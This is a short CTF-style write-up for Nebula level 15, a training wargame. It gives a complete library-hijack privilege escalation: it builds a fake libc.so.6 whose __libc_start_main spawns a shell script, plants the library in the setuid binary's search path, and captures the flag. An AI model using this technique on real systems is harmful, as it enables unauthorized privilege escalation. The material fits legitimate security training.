.. _nebula15:

.. role:: bash(code)
	  :language: bash

.. role:: c(code)
	  :language: c
		     
Nebula level 15
===============

Basic information
-----------------

**Home Page:** https://exploit-exercises.com/nebula/level00/

**No source code given**

Solution
--------

:bash:`strace /home/flag15/flag15`

We can see that the program is looking for the library libc.so.6

We have to create multiples files in order to solve this level

First create a version file as follows

:bash:`echo "GLIBC_2.0 { };" > version`

Then create a bash script and name it run.sh

.. code-block:: bash

		#!/bin/bash -ex

		gcc -fPIC -g -c -Wall getflag.c
		gcc -shared -Wl,-Bstatic,-soname,libc.so.6,--version-script,version -o libc.so.6 getflag.o  -L/usr/lib/i386-linux-gnu -static-libgcc
		mv /home/level15/libc.so.6 /var/tmp/flag15/
		/home/flag15/flag15
		cat /home/flag15/getflag.log

Then create your shared library and name it getflag

.. code-block:: c

		#include <stdio.h>
		#include <sys/syscall.h>
		#include <unistd.h>

		void __cxa_finalize(void *d) {
		    return;
		}

		int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
		    char *args_new[] = { "/bin/sh", "/home/level15/flag.sh" };
		    execve("/bin/sh", args_new, (char *const *)NULL);
		    return 0;
		}

Finally create a bash script and name it flag.sh

.. code-block:: bash

		#!/bin/bash

		getflag > /home/flag15/getflag.log
		
Then execute the run.sh file

:bash:`bash run.sh`
